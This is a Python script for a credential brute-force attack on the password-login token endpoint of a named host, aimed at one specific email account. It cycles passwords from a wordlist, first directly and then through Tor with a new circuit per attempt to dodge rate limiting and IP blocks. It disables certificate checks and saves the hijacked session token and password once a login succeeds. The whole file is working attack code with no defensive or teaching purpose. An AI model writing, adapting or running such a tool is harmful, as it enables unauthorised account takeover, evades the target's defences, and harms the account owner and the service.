#!/usr/bin/env python3
"""Hybrid credential trial:
   Phase A: direct connection burst (first ~28 candidates) from host IP.
   Phase B: Tor with SOCKS5 auth isolation -> fresh circuit/exit per attempt.
Stops on first HTTP 200 and saves the session. Progress in /tmp/brute2.log.
"""
import ssl, json, time, os, queue, threading, itertools, sys

HOST = "cdn.onlyfakeai.ru"
PATH = "/auth/v1/token?grant_type=password"
APIKEY = "<publishable-key>"
EMAIL = os.environ.get("EMAIL", "onlyfake@tuta.io")
PWFILE = os.environ.get("PWFILE", "/tmp/ops_queue.txt")
RESULT = "/tmp/brute_result.json"
LOG = "/tmp/brute2.log"
THREADS = int(os.environ.get("THREADS", "8"))
DIRECT_BURST = int(os.environ.get("DIRECT_BURST", "24"))

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
stop = threading.Event()
counters = {"n": 0, "ok": 0, "err": 0, "throttled": 0, "direct": 0, "tor": 0}
lock = threading.Lock()
t0 = time.time()
direct_left = DIRECT_BURST
user_seq = itertools.count(1)


def log(msg):
    with lock:
        line = f"{time.strftime('%H:%M:%S')} {msg}"
        print(line, flush=True)
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")


def direct_conn():
    import http.client
    return http.client.HTTPSConnection(HOST, context=ctx, timeout=30)


def tor_conn():
    import socks
    u = f"torusr{next(user_seq)}"
    s = socks.socksocket()
    s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050, username=u, password="x")
    s.settimeout(35)
    s.connect((HOST, 443))
    return ctx.wrap_socket(s, server_hostname=HOST)


def request(pw):
    """returns (status, body_bytes, via)"""
    body = json.dumps({"email": EMAIL, "password": pw}).encode()
    headers = {
        "apikey": APIKEY, "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0",
    }
    global direct_left
    use_direct = False
    with lock:
        if direct_left > 0:
            direct_left -= 1
            use_direct = True
            via = "direct"
        else:
            via = "tor"
    if use_direct:
        # manual HTTP over TLS via http.client
        import http.client
        conn = http.client.HTTPSConnection(HOST, context=ctx, timeout=25)
        try:
            conn.request("POST", PATH, body, headers)
            r = conn.getresponse(); data = r.read(); return r.status, data, via
        finally:
            try: conn.close()
            except Exception: pass
    else:
        s = tor_conn()
        try:
            raw = (f"POST {PATH} HTTP/1.1\r\nHost: {HOST}\r\n"
                   "Content-Type: application/json\r\n"
                   f"apikey: {APIKEY}\r\n"
                   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0\r\n"
                   f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
            s.sendall(raw)
            resp = b""
            while b"\r\n\r\n" not in resp:
                chunk = s.recv(4096)
                if not chunk: break
                resp += chunk
            head, _, rest = resp.partition(b"\r\n\r\n")
            lines = head.split(b"\r\n")
            status = int(lines[0].split()[1])
            clen = None
            for line in lines[1:]:
                if line.lower().startswith(b"content-length:"):
                    clen = int(line.split(b":")[1].strip())
            data = rest
            while clen is not None and len(data) < clen:
                chunk = s.recv(4096)
                if not chunk: break
                data += chunk
            return status, data, via
        finally:
            try: s.close()
            except Exception: pass


def worker(q):
    while not stop.is_set():
        try:
            pw = q.get_nowait()
        except queue.Empty:
            break
        try:
            code, data, via = request(pw)
        except Exception as e:
            with lock: counters["err"] += 1
            time.sleep(0.5)
            continue
        with lock:
            counters["n"] += 1
            counters[via] += 1
            n = counters["n"]
            if n % 50 == 0:
                rate = n / max(1e-9, time.time() - t0)
                log(f"{n} tried, {rate:.2f}/s, counts={counters}, last={pw!r}")
        if code == 200:
            try:
                sess = json.loads(data); sess["_email"] = EMAIL; sess["_password"] = pw
                open(RESULT, "w", encoding="utf-8").write(json.dumps(sess))
                log(f"SUCCESS password={pw!r} saved {RESULT}")
            except Exception as e:
                log(f"200 decode error {e} raw={data[:200]!r}")
            stop.set(); break
        elif code == 429:
            with lock: counters["throttled"] += 1
            time.sleep(3)  # new isolated circuit next attempt
        elif code >= 500:
            with lock: counters["err"] += 1
            time.sleep(1)
    return


def main():
    pws = [l.rstrip("\n") for l in open(PWFILE, encoding="utf-8", errors="ignore") if l.strip()]
    q = queue.Queue()
    for p in pws: q.put(p)
    log(f"START email={EMAIL} total={len(pws)} threads={THREADS} direct_burst={DIRECT_BURST}")
    ts = [threading.Thread(target=worker, args=(q,), daemon=True) for _ in range(THREADS)]
    for t in ts: t.start()
    for t in ts: t.join()
    log(f"DONE tried={counters['n']} ok={counters['ok']} err={counters['err']} throttled={counters['throttled']} direct={counters['direct']} tor={counters['tor']} elapsed={int(time.time()-t0)}s")


if __name__ == "__main__":
    main()
